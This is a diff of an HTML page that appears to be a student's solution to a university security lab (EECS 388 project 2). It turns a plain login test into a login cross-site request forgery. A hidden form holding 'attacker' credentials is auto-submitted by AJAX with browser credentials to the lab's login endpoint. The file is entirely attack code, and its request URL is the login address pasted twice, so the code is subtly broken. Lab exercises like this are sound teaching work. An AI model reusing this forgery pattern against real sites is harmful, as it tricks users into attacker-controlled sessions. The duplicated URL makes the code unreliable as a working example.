@@ -1,19 +1,18 @@
-<html><body>
-	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
-	<form id="form1" method="post" action="https://eecs388.org/project2/login?csrfdefense=0&xssdefense=4"> 
-		<input name="username" value="tomsand"> 
-		<input name="password" value="tomsand">
-	</form>
-	<script>
-		$.ajax({type: 'POST',
-			data: $('#form1').serialize(),
-			url: 'https://eecs388.org/project2/login?csrfdefense=0&xssdefense=4',
-			success: function (response) {
-            			alert(response.status);
-        		},
-        		error: function () {
-            			alert("error");
-        		}
-		});
-	</script>
-</body></html>
+<html>
+<meta charset="UTF-8">
+<body>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+        <form id="form1" method="post" action="https://eecs388.org/project2/login?csrfdefense=0&xssdefense=4" style="display: none;">
+                <input name="username" value="attacker">
+                <input name="password" value="l33th4x">
+        </form>
+        <script>
+                $.ajax({type: 'POST',
+                        data: $('#form1').serialize(),
+                        url: 'https://eecs388.org/project2/login?csrfdefense=0&xssdefense=4https://eecs388.org/project2/login?csrfdefense=0&xssdefense=4',
+                        xhrFields: {withCredentials: true} 
+               });
+        </script>
+</body>
+</html>
+
